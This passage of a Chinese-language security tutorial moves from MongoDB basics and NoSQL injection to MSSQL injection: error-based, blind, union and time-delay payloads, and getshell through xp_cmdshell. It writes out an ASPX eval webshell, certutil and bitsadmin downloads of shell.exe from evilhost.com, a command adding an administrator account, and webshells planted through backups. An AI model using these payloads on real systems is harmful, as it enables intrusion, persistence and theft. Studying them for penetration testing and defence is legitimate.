Du'\n  }\n]\n```\n\n可以看到这里成功插入了一个文档\n\n#### 插入多个文档insertMany()\n\n语法\n\n```\ndb.collection.insertMany([documents], options)\n```\n\n- documents：要插入的文档数组。\n- options（可选）：一个可选参数对象，可以包含 ordered、writeConcern 和 bypassDocumentValidation 等。\n\n这里和单个文档不同的是，这里的插入多个文档数组，最后用方括号包裹\n\n测试一下\n\n```sql\nhelloworld> db.createCollection(\"user2\")\n{ ok: 1 }\nhelloworld> db.user2.insertMany([\n... {name:\"wang\",age: 19,city: \"Bei Jing\"},\n... {name:\"zhang\",age: 21,city:\"New York\"}\n... ]);\n{\n  acknowledged: true,\n  insertedIds: {\n    '0': ObjectId('682d9abd9f4df71519c59f36'),\n    '1': ObjectId('682d9abd9f4df71519c59f37')\n  }\n}\n```\n\nfind()查询一下\n\n```sql\nhelloworld> db.user2.find()\n[\n  {\n    _id: ObjectId('682d9abd9f4df71519c59f36'),\n    name: 'wang',\n    age: 19,\n    city: 'Bei Jing'\n  },\n  {\n    _id: ObjectId('682d9abd9f4df71519c59f37'),\n    name: 'zhang',\n    age: 21,\n    city: 'New York'\n  }\n]\n```\n\n可以看到这里插入了两行文档数组\n\n### 更新文档\n\n常用的方法包括 **updateOne()、updateMany()、replaceOne() 和 findOneAndUpdate()**。\n\n使用 `updateOne()` 或 `save()` 方法来更新集合中的文档\n\n#### **updateOne()方法**\n\nupdateOne() 方法用于更新匹配过滤器的单个文档。\n\n基础语法\n\n```\ndb.collection.updateOne(filter, update, options)\n```\n\n- **filter**：用于查找文档的查询条件。\n- **update**：指定更新操作的文档或更新操作符。\n- **options**：可选参数对象，如 `upsert`、`arrayFilters` 等。\n\n那我们用这个方法将age年龄从19更新到30\n\n```sql\nhelloworld> db.user.updateOne({\n... name:\"wanth3f1ag\"},\n... {$set:{age:30}}\n... );\n{\n  acknowledged: true,\n  insertedId: null,\n  matchedCount: 1,\n  modifiedCount: 1,\n  upsertedCount: 0\n}\n```\n\n然后我们查询一下文档是否更新\n\n```sql\nhelloworld> db.user.find()\n[\n  {\n    _id: ObjectId('682d99b59f4df71519c59f35'),\n    name: 'wanth3f1ag',\n    age: 30,\n    city: 'Cheng Du'\n  }\n]\n```\n\n#### updateMany()方法\n\nupdateMany() 方法用于更新所有匹配过滤器的文档。\n\n语法\n\n```\ndb.collection.updateMany(filter, update, options)\n```\n\n- **filter**：用于查找文档的查询条件。\n- **update**：指定更新操作的文档或更新操作符。\n- **options**：可选参数对象，如 `upsert`、`arrayFilters` 等。\n\n#### replaceOne()方法\n\n也是更新单个文档的\n\n语法\n\n```\ndb.collection.replaceOne(filter, replacement, options)\n```\n\n- **filter**：用于查找文档的查询条件。\n- **replacement**：新的文档，将替换旧的文档。\n- **options**：可选参数对象，如 `upsert` 等。\n\n### 删除文档\n\n常用的删除文档方法包括 deleteOne()、deleteMany() 以及 findOneAndDelete()。\n\n语法\n\n```\ndb.collection.deleteOne(filter, options)\ndb.collection.deleteMany(filter, options)\n```\n\n### 查询文档\n\nMongoDB 查询文档使用 **find()**、**findOne()** 方法。\n\n####  **find()**方法\n\n语法\n\n```\ndb.collection.find(query, projection)\n```\n\n- **query**：用于查找文档的查询条件。默认为 `{}`，即匹配所有文档。\n- **projection**（可选）：指定返回结果中包含或排除的字段。\n\n#### findOne()方法\n\n语法\n\n```\ndb.collection.findOne(query, projection)\n```\n\n如果找到多个匹配的文档，它只返回第一个。\n\n- **query**：用于查找文档的查询条件。默认为 `{}`，即匹配所有文档。\n- **projection**（可选）：指定返回结果中包含或排除的字段。\n\n## 4.关于操作符\n\n### 比较操作符\n\nMongoDB 支持多种比较操作符，如 **$gt(大于)、$lt(小于)、$gte(大于等于)、$lte(小于等于)、$eq(等于)、$ne(不等于)** 等。\n\n| 操作符 | 描述             | 示例                              |\n| :----- | :--------------- | :-------------------------------- |\n| `$eq`  | 等于             | `{ age: { $eq: 25 } }`            |\n| `$ne`  | 不等于           | `{ age: { $ne: 25 } }`            |\n| `$gt`  | 大于             | `{ age: { $gt: 25 } }`            |\n| `$gte` | 大于等于         | `{ age: { $gte: 25 } }`           |\n| `$lt`  | 小于             | `{ age: { $lt: 25 } }`            |\n| `$lte` | 小于等于         | `{ age: { $lte: 25 } }`           |\n| `$in`  | 在指定的数组中   | `{ age: { $in: [25, 30, 35] } }`  |\n| `$nin` | 不在指定的数组中 | `{ age: { $nin: [25, 30, 35] } }` |\n\n语法\n\n```\n{ field: { 比较操作符 : value } }\n```\n\n例如我们查找年龄大于等于20的文档\n\n```sql\nhelloworld> db.user2.find()\n[\n  {\n    _id: ObjectId('682d9abd9f4df71519c59f36'),\n    name: 'wang',\n    age: 19,\n    city: 'Bei Jing'\n  },\n  {\n    _id: ObjectId('682d9abd9f4df71519c59f37'),\n    name: 'zhang',\n    age: 21,\n    city: 'New York'\n  }\n]\nhelloworld> db.user2.find({age:{$gte:20}})\n[\n  {\n    _id: ObjectId('682d9abd9f4df71519c59f37'),\n    name: 'zhang',\n    age: 21,\n    city: 'New York'\n  }\n]\n```\n\n### 逻辑操作符\n\n**$and、$or、$not、$nor**等逻辑操作符\n\n| 操作符 | 描述                   | 示例                                                       |\n| :----- | :--------------------- | :--------------------------------------------------------- |\n| `$and` | 逻辑与，符合所有条件   | `{ $and: [ { age: { $gt: 25 } }, { city: \"New York\" } ] }` |\n| `$or`  | 逻辑或，符合任意条件   | `{ $or: [ { age: { $lt: 25 } }, { city: \"New York\" } ] }`  |\n| `$not` | 取反，不符合条件       | `{ age: { $not: { $gt: 25 } } }`                           |\n| `$nor` | 逻辑或非，均不符合条件 | `{ $nor: [ { age: { $gt: 25 } }, { city: \"New York\" } ] }` |\n\n语法\n\n```\n{ $and/nor/or: [ { condition1 }, { condition2 } ] }\n```\n\n例如我们需要查找年龄大于10或者城市为纽约的\n\n```sql\nhelloworld> db.user2.find({ $or: [ { age: { $gte: 10 } }, { city: \"New York\" }] })\n[\n  {\n    _id: ObjectId('682d9abd9f4df71519c59f36'),\n    name: 'wang',\n    age: 19,\n    city: 'Bei Jing'\n  },\n  {\n    _id: ObjectId('682d9abd9f4df71519c59f37'),\n    name: 'zhang',\n    age: 21,\n    city: 'New York'\n  }\n]\n```\n\n### 正则表达式\n\nMongoDB 使用 **$regex** 操作符来设置匹配字符串的正则表达式。\n\n| `$regex` | 匹配正则表达式 | `{ name: { $regex: /^A/ } }` |\n| -------- | -------------- | ---------------------------- |\n\n正则表达式符号\n\n| 符号     | 描述                                                      |\n| -------- | --------------------------------------------------------- |\n| `.`      | 匹配任意单个字符（除换行符外）。                          |\n| `^`      | 匹配字符串的开头。                                        |\n| `$`      | 匹配字符串的结尾。                                        |\n| `*`      | 匹配前面的字符零次或多次。                                |\n| `+`      | 匹配前面的字符一次或多次。                                |\n| `?`      | 匹配前面的字符零次或一次。                                |\n| `{n}`    | 匹配前面的字符恰好 `n` 次。                               |\n| `{n,}`   | 匹配前面的字符至少 `n` 次。                               |\n| `{n,m}`  | 匹配前面的字符至少 `n` 次，最多 `m` 次。                  |\n| `[abc]`  | 匹配字符集合中的任意一个字符（如 `a`、`b` 或 `c`）。      |\n| `[^abc]` | 匹配不在字符集合中的任意一个字符。                        |\n| `\\d`     | 匹配任意数字字符（等价于 `[0-9]`）。                      |\n| `\\D`     | 匹配任意非数字字符。                                      |\n| `\\w`     | 匹配任意字母、数字或下划线字符（等价于 `[a-zA-Z0-9_]`）。 |\n| `\\W`     | 匹配任意非字母、数字或下划线字符。                        |\n| `\\s`     | 匹配任意空白字符（包括空格、制表符、换行符等）。          |\n| `\\S`     | 匹配任意非空白字符。                                      |\n| `(abc)`  | 捕获组，匹配 `abc` 并将其保存为子匹配项。                 |\n| `        | `                                                         |\n\n## Nosql注入\n\n和传统的mysql不一样，nosql的查询语法是基于应用程序的编程语言去决定的，例如PHP，Java，Python等，所以这也意味着存在nosql注入的时候我们不仅可以在数据库中执行命令，也可以在应用程序中执行命令\n\n### 注入方法\n\n#### 1.重言式注入\n\n- **重言式注入**又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。\n\n这个的话往往需要结合操作符去进行注入，例如在这些操作符中，**$ne**就是我们在重言式注入中需要利用到的那个。它的作用是将不等于指定值的数据都查询出来。比如$ne=1时就是将所有不等于1的数据都查询出来。\n\n# mssql注入\n\n借鉴师傅的文章:https://y4er.com/posts/mssql-injection-learn/#%E7%AC%A6%E5%8F%B7,https://y4er.com/posts/mssql-getshell/\n\nhttps://www.secpulse.com/archives/193819.html\n\n什么是mssql？\n\nMSSQL，或称为Microsoft SQL Server，mssql是Microsoft System Structured Query Language 的缩写，是指微软操作系统的数据库语言，是由微软开发的一种数据库关系管理系统（RDBMS）。\n\n### MSSQL基础使用\n\n讲到mssql数据库，我们首先要了解到里面的自带库\n\n默认自带库的类型\n\n```\nmaster   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。\nmodel    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础\nmsdb     //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。\ntempdb   //它为临时表和其他临时工作提供了一个存储区。\n```\n\n其中最常用的就是master库了\n\n#### master库\n\nmaster数据库是系统数据库，这里存储了所有数据库名和存储过程，就好比mysql里面的information_schema元数据库，这个存储过程其实就好比是一个函数调用的过程\n\n储存过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。(不是注入的重点，主要是后面getshell需要用，所以简单了解一下就可以了，下面还会带到)\n\n这里贴一张关于master库的展示图\n\n![1.1.1](./../image/achieve/202411/sql深入浅出/1.1.1.png)\n\n在master数据库中有`master.dbo.sysdatabases`视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有`syscolumns`存储着所有的字段，可编程性储存着我们的函数。\n\n查询数据库语句\n\n```mssql\nselect name from master.dbo.sysdatabases;\n#在 SQL Server 中，查询master.dbo.sysdatabases视图可以用于获取实例数据库中所有数据库的名称。\nmaster\ntempdb\nmodel\nmsdb\ntest\nasp_net\nasp_test\n```\n\n关于字段\n\n```mssql\nselect top 1 name,xtype from sysobjects;\n#这是一个 SELECT 查询语句，它从 sysobjects 表中选择顶部 1 条记录，并仅检索 name 和 xtype 列的值。\n```\n\n但是这里的xtype是可控的，可以是下面这些类型的一种\n\n- C = CHECK 约束\n- D = 默认值或 DEFAULT 约束\n- F = FOREIGN KEY 约束\n- L = 日志\n- FN = 标量函数\n- IF = 内嵌表函数\n- P = 存储过程\n- PK = PRIMARY KEY 约束（类型是 K）\n- RF = 复制筛选存储过程\n- S = 系统表\n- TF = 表函数\n- TR = 触发器\n- U = 用户表\n- UQ = UNIQUE 约束（类型是 K）\n- V = 视图\n- X = 扩展存储过程\n\n### 信息搜集\n\n我们先了解一下服务器级别和数据库级别的角色的区别\n\n1. 服务器级别角色：\n   - 服务器级别角色是定义在整个 SQL Server 实例上的一组固定角色。\n   - 这些角色控制着整个服务器的权限和功能，如安全设置、备份操作、服务器级别配置等。\n2. 数据库级别角色：\n   - 数据库级别角色是定义在特定数据库中的一组角色。\n   - 这些角色控制着数据库中对象的访问权限，如表、视图、存储过程等。\n   - 数据库级别角色与服务器级别角色的作用范围不同，主要关注数据库内部的权限控制。\n\n#### 服务器级别\n\n![image-20241206194113814](./../image/achieve/202411/sql深入浅出/image-20241206194113814-1733485276606-10.png)\n\n我们可以用`IS_SRVROLEMEMBER`来判断服务器级别的固定角色\n\n`IS_SRVROLEMEMBER` 是一个系统函数，用于检查指定登录名是否属于指定的服务器级别的固定角色。我们可以利用这个函数的role的有效值去判断服务器级别的固定角色\n\n| 返回值 | 描述                                                 |\n| ------ | ---------------------------------------------------- |\n| 0      | login 不是 role 的成员。                             |\n| 1      | login 是 role 的成员。                               |\n| NULL   | role 或 login 无效，或者没有查看角色成员身份的权限。 |\n\n然后我们构造语句\n\n```mssql\nand 1=(select is_srvrolemember('sysadmin'))\nand 1=(select is_srvrolemember('serveradmin'))\nand 1=(select is_srvrolemember('setupadmin'))\nand 1=(select is_srvrolemember('securityadmin'))\nand 1=(select is_srvrolemember('diskadmin'))\nand 1=(select is_srvrolemember('bulkadmin'))\n```\n\n`is_srvrolemember` 函数需要传入两个参数，即固定角色名和登录名。\n\n在 SQLMap 中使用 –is-dba 命令可以判断是否为管理员权限，即服务器级别的固定角色\n\n```mssql\nselect * from admin where id =1 AND 5560 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (IS_SRVROLEMEMBER(CHAR(115)+CHAR(121)+CHAR(115)+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))=1) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)))\n```\n\n#### 数据库级别\n\n![image-20241206194907105](./../image/achieve/202411/sql深入浅出/image-20241206194907105-1733485750110-12.png)\n\n数据库级别的应用角色用`IS_ROLEMEMBER`函数判断\n\n```mssql\n?id=1 and 1=(select IS_ROLEMEMBER('db_owner'))--\n?id=1 and 1=(select IS_ROLEMEMBER('db_securityadmin'))--\n?id=1 and 1=(select IS_ROLEMEMBER('db_accessadmin'))--\n?id=1 and 1=(select IS_ROLEMEMBER('db_backupoperator'))--\n?id=1 and 1=(select IS_ROLEMEMBER('db_ddladmin'))--\n?id=1 and 1=(select IS_ROLEMEMBER('db_datawriter'))--\n?id=1 and 1=(select IS_ROLEMEMBER('db_datareader'))--\n?id=1 and 1=(select IS_ROLEMEMBER('db_denydatawriter'))--\n```\n\n讲完了这个我们再来了解一下基本信息\n\n```\nSELECT @@version; //版本\nSELECT user;\t\t//用户\nSELECT DB_NAME();\t//当前数据库名，你可以用db_name(n)来遍历出所有的数据库\nSELECT @@servername;\t//主机名\n```\n\n那么站库分离可以这么来判断\n\n```\nselect * from user where id='1' and host_name()=@@servername;--'\n```\n\n站库分离的话实际上就是站点和数据库各司其职，二者互相独立，提高系统性能和可维护性\n\n### 常见符号\n\n1.注释符号\n\n```\n/**/\n--\n//\n```\n\n双斜杠是用来注释单行代码的，而/**/是用于注释多行代码的\n\n2.空白字符\n\n```\n空格字符（%20）\n制表符\\t\n换行符\\n\n回车符\\r\n```\n\n3.运算符\n\n```\n&位与逻辑运算符，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为1时，结果中的位才被设置为1，否则，结果中的位被设置为0\n|位或逻辑运算符，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为1时，结果的位就被设置为1，只有当两个位的值都为0时，结果中的位才被设置为0\n^位异或逻辑运算符，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为1时，结果中的位就被设置为1；只有当两个位的值都为0或1时，结果中的位才被设置为0\n\nALL 如果一组的比较都为true，则比较结果为true\nAND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false\nANY 如果一组的比较中任何一个为true，则结果为true\nBETWEEN 如果操作数在某个范围之内，那么结果为true\nEXISTS  如果子查询中包含了一些行，那么结果为true\nIN  如果操作数等于表达式列表中的一个，那么结果为true\nLIKE    如果操作数与某种模式相匹配，那么结果为true\nNOT 对任何其他布尔运算符的结果值取反\nOR  如果两个布尔表达式中的任何一个为true，那么结果为true\nSOME    如果在一组比较中，有些比较为true，那么结果为true\n```\n\n### 基本注入流程\n\n爆破当前数据库\n\n```\nSELECT * FROM Fanmv_Admin WHERE AdminID=1 and DB_NAME()>1;\n?id=1'and db_name()>0;--\n```\n\n为什么这个可以爆出来呢\n\n这里利用mssql数据类型不一样的报错情况，在将 nvarchar 值 'FanmvCMS' 转换成数据类型 int 时失败。从而把数据库爆出来\n\n爆破表名\n\n在将 nvarchar 值 'Fanmv_Admin' 转换成数据类型 int 时失败。\n\n```mssql\nSELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 name from sysobjects WHERE xtype='u');\n查询表的完整步骤\n?id=1 and 1=(select top 1 name from sysobjects where xtype='u');--\n//旨在返回数据库中第一个用户表的名称。\n//然后通过不断调整查询条件的name not in('table_name')，逐步排除已知表名去拿到我们想找的表名\n?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts'));--\n?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers'));--\n?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates'));--\n('fsb_accounts', 'fsb_fund_transfers'));--\n?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates'));--\n?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates', 'fsb_messages'));--\n?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates', 'fsb_messages', 'fsb_transactions'));--\n?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates', 'fsb_messages', 'fsb_transactions', 'fsb_users'));-\n```\n\n爆破字段名\n\n在将 nvarchar 值 'AdminID' 转换成数据类型 int 时失败。\n\n```mssql\nSELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'Fanmv_Admin'));\n查询字段名的具体步骤\n?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_accounts'));--\n//尝试从sysobjects中获取fsb_accounts的ID，然后从syscolumns中获取该表的第一个字段名\n//然后逐步排除字段找到我们想要的字段名\n?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_accounts') and name<>'account_no');--\n?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_accounts') and name<>'account_no' and name<>'account_type');--\n?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_accounts') and name<>'account_no' and name<>'account_type' and name<>'balance_amount');--\n```\n\n爆破数据\n\n在将 varchar 值 '81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6' 转换成数据类型 int 时失败。\n\n```mssql\nSELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 AdminPass from Fanmv_Admin);\n查询数据的具体步骤\n?id=1 and 1=(select top 1 branch from fsb_accounts);--\n//尝试从表 fsb_accounts 中获取第一个 branch 列的值。通过 select top 1 子句，它只返回结果集中的第一个值。\n?id=1 and 1=(select top 1 branch from fsb_accounts where branch<>'Texas-Remington Circle');--\n//排除了 branch 列值为 'Texas-Remington Circle' 的记录，只返回除此之外的第一个 branch 列的值。\n?id=1 and 1=(select top 1 branch from fsb_accounts where branch not in ('Texas-Remington Circle', 'Mahnattan - New york'));--\n//除了排除 'Texas-Remington Circle' 外，还排除了 'Mahnattan - New york'，然后返回除这两个值之外的第一个 branch 列的值。\n```\n\n当然，在mssql中除了借助 `sysobjects` 表和 `syscolumns` 表获取表名、列名外，MSSQL 数据库中也兼容 `information_schema`，里面存放了数据表表名和字段名。使用方法与 MySQL 相同。\n\n```mssql\n/* 查询表名可以用 information_schema.tables */\n?id=1 and 1=(select top 1 table_name from information_schema.tables);--\n/* 查询列名可以用 information_schema.columns */\n?id=1 and 1=(select top 1 column_name from information_schema.columns where table_name='fsb_accounts');--\n```\n\n我们要判断当前的表名和列名，也可以用`having 1=1` 和 `group by`\n\n```\nSELECT * FROM Fanmv_Admin WHERE AdminID=1 having 1=1\n```\n\n选择列表中的列 'Fanmv_Admin.AdminID' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。\n\n爆出一列，将其用group by 拼接进去继续往后爆其他的\n\n```\nSELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID having 1=1\n```\n\n选择列表中的列 'Fanmv_Admin.IsSystem' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。\n\n```\nSELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID,IsSystem having 1=1\n```\n\n选择列表中的列 'Fanmv_Admin.AdminName' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。\n\n以此爆出所有字段\n\n### mssql报错注入\n\n其实上面已经讲到了报错注入的一些基本用法，但是这里还是得把概念理清楚\n\nMSSQL 数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。前提是服务器允许返回报错信息。报错注入利用的就是显式或隐式的类型转换来报错\n\n先看隐式报错\n\n隐式报错（Implicit Error）是指在代码执行过程中发生错误，但这些错误并不会显式地抛出异常或产生明确的错误消息。相反，这些错误可能会导致程序出现不可预料的行为或结果\n\n```\nselect * from admin where id =1 and (select user)>0\n```\n\nuser和0进行比较时因为数据类型不一致就会报错\n\n再看显式报错，显式报错（Explicit Error）是指通过有意设置错误条件来产生错误消息的情况。\n\n一般显式报错中我们会用`cast`和`convert`函数去有意的设置错误条件达到报错注入的目的\n\n在SQL中，CAST和CONVERT函数都用于将一个数据类型转换为另一个数据类型\n\n```\nselect * from admin where id =1 (select CAST(USER as int))\nselect * from admin where id =1 (select convert(int,user))\n```\n\n### 盲注\n\n其实和mysql的一样，通过设置判断条件并通过页面的回显信息去判断条件是否符合来达到注入的效果\n\n布尔盲注\n\n```\n?id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) >= 109\n```\n\n布尔盲注没有mssql那么多姿势，大同小异截取字符串比较，通过判断条件去拿到真实的内容\n\n时间盲注\n\n```\n?id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 waitfor delay '0:0:5'--\n?id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))>1 waitfor delay '0:0:5'--\n```\n\n`waitfor delay '0:0:5'`是mssql的延时语法\n\n但是mssql的盲注还是相对来说简单很多的\n\n### 联合注入\n\nmssql不用数字占位，因为可能会发生隐式转换，我们用null来占位\n\n在mysql中，爆数据库我们通常是这样去做的\n\n```mysql\n?id=1 union select 1,2,database()#\n```\n\n但是在mssql中我们就得稍微变一下\n\n```\n?id=1 union select null,null,DB_NAME();\n也可以通过这样去联合报错\n?id=1 union select null,null, (select CAST(db_name() as int))\n```\n\n在mssql中我们如果想查询多条数据可以使用%2B 也就是加号\n\n```\n?id=1 union select null,name%2Bpass,null from info\n```\n\n### getshell和提权\n\n#### 1.getshell\n\ngetshell也就涉及到了权限的问题，能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。它数据库权限是`db_owner`，当然你如果有其他具有do_owner权限的用户也可以。\n\n所以我们getshell的两大前提:\n\n- 有相应的权限db_owner\n- 知道web目录的绝对路径\n\n那我们先讲一下怎么拿到目录的绝对路径\n\n##### 1.1寻找绝对路径\n\n寻找绝对目录一般有以下几个思路\n\n1. 报错寻找 \n\n2. 字典猜\n\n3. 旁站信息收集\n\n4. 调用储存过程来搜索\n\n5. 读配置文件\n\n前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。\n\n在mssql中有两个存储过程可以帮我们来找绝对路径：`xp_cmdshell xp_dirtree`\n\n我们一个个进行讲解\n\n- xp_dirtree\n\n在SQL Server中，xp_dirtree是一个扩展存储过程，用于从指定路径中检索所有子文件和子目录的列表。它返回一个结果集，其中包含指定路径下所有子文件和子目录的详细信息。\n\n以下是xp_dirtree的一般用法：\n\n```\nexecute master..xp_dirtree 'c:' --列出所有c:\\文件、目录、子目录 \nexecute master..xp_dirtree 'c:',1 --只列c:\\目录\nexecute master..xp_dirtree 'c:',1,1 --列c:\\目录、文件\n```\n\n那么我们怎么利用呢，执行xp_dirtree返回我们传入的参数如果你想把文件名一起返回来，因为没有回显所以可以这样创建一个临时的表插入\n\n```mssql\n?id=1;CREATE TABLE tmp (dir varchar(8000),num int,num1 int);\n//创建一个临时表tmp，该表包含三列：dir用于存储文件或目录的路径，num和num1用于存储相关的数字信息。\n?id=1;insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1\n//INSERT INTO语句执行了master..xp_dirtree存储过程，并将其结果插入到之前创建的表tmp中。\n//参数1和1分别是用于指示是否要处理子目录以及返回文件和目录的深度的参数。\n```\n\n- xp_cmdshell\n\n`xp_cmdshell` 存储过程可以生成并执行 Windows 命令，任何输出都作为文本返回。`xp_cmdshell` 功能非常强大，但是从 MSSQL 2005 版本之后默认处于禁用状态，可以执行 `sp_configure` 来启用或禁用 `xp_cmdshell`。\n\n`xp_cmdshell` 的利用条件如下：\n\n- • 当前用户具有 DBA 权限\n- • 依赖于 xplog70.dll\n- • `xp_cmdshell` 存储过程存在并已启用\n\n```mssql\n/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */\nSELECT IS_SRVROLEMEMBER('sysadmin');\n\n/* 查看是否存在 xp_cmdshell，返回 1 则存在 */\nSELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell'\n\n/* 开启 xp_cmdshell */\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n\n/* 关闭 xp_cmdshell */\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;\n```\n\n一般的用法(执行命令)\n\n```\nEXEC master.dbo.xp_cmdshell 'whoami'\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'dir c:'\nEXEC master..xp_cmdshell 'dir c:'\nEXEC master..xp_cmdshell 'ipconfig/all'\nEXEC master..xp_cmdshell 'systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"'\nEXEC master..xp_cmdshell 'reg query HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal\" \"ServerWinStationsRDP-Tcp /v PortNumber'\nEXEC master..xp_cmdshell 'net user hacker Passw0rd /add',NO_OUTPUT\nEXEC master..xp_cmdshell 'net localgroup Administrators hacker /add',NO_OUTPUT\n```\n\n接下来我们先来看cmd中怎么查找文件。\n\n```mssql\nC:\\Users\\Aleen>for /r c:\\ %i in (1*.aspx) do @echo %i\n/*\n这是一个for循环命令，用于在指定目录及其子目录中遍历文件。\n%i：这是循环变量，用于存储每个匹配到的文件路径。\n(1*.aspx)：这是匹配文件名的模式。1*.aspx表示以1开头且以.aspx结尾的文件。\ndo关键字后面的命令@echo %i用于打印匹配到的文件路径。\n%i表示当前循环的文件路径。\n*/\ne:\\code\\php\\1.php\nC:\\Users\\Y4er>\n```\n\n所以我只需要建立一个表 存在一个char字段就可以了\n\n```\n?id=1;CREATE TABLE cmdtmp (dir varchar(8000));//创建一个名为cmdtmp的表。\n?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i'\n```\n\n然后通过注入去查询该表就可以了。\n\n到这里的话我们就了解完了绝对路径的获取方法，那我们接下来该怎么拿shell呢\n\n##### 1.2 xp_cmdshell拿shell\n\n上面已经讲到,xp_cmdshell可以用于执行Windows的cmd命令，那我们可以通过cmd 的echo命令来写入shell\n\n```\n?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language=\"Jscript\"%^>^<%eval(Request.Item[\"pass\"],\"unsafe\");%^> > c:\\\\WWW\\\\404.aspx' ;\n```\n\n也可以通过下载文件去把我们的payload传入\n\n下载文件通常有下面几种姿势\n\n1. certutil\n2. vbs\n3. bitsadmin\n4. powershell\n5. ftp\n\n这里介绍两种比较常用的\n\n调用 certutil 下载文件\n\n```\nEXEC master.dbo.xp_cmdshell 'cd C:UsersPublic & certutil -urlcache -split -f http://evilhost.com/download/shell.exe';\n```\n\n调用 bitsadmin 下载文件并写入系统启动项\n\n```\nEXEC master.dbo.xp_cmdshell 'bitsadmin /transfer n http://evilhost.com/image/shell.exe C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUpshell.exe'\n```\n\n##### 1.3 差异备份拿shell\n\n```mssql\n1. backup database 库名 to disk = 'c:\\bak.bak';--\n\n2. create table [dbo].[test] ([cmd] [image]);\n\n3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)\n\n4. backup database 库名 to disk='C:\\d.asp' WITH DIFFERENTIAL,FORMAT;--\n```\n\n差异备份我们有多种情况可能不成功，一般就是目录权限的问题，第一次备份的目录是否可能没有权限，第二次备份到网站目录是否有权限，所以一般不要直接备份到c盘根目录\n\n当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用前面提到的 定义局部变量来执行。\n\n##### 1.4 log备份拿shell\n\nLOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式\n\n```\n1. alter database 库名 set RECOVERY FULL \n\n2. create table cmd (a image) \n\n3. backup log 库名 to disk = 'c:\\xxx' with init \n\n4. insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) \n\n5. backup log 库名 to disk = 'c:\\xxx\\2.asp'\n```\n\nlog备份的好处就是备份出来的webshell的文件大小非常的小\n\n#### 2.提权getsystem\n\n我们继续来探究该怎么提权的问题\n\n一般来说我们用xp_cmdshell去执行我们的payload后，通常会利用Cobalt Strike\n\nCobalt Strike是一款专业的渗透测试工具，一些Cobalt Strike的主要特点包括：\n\n1. **木马植入**：Cobalt 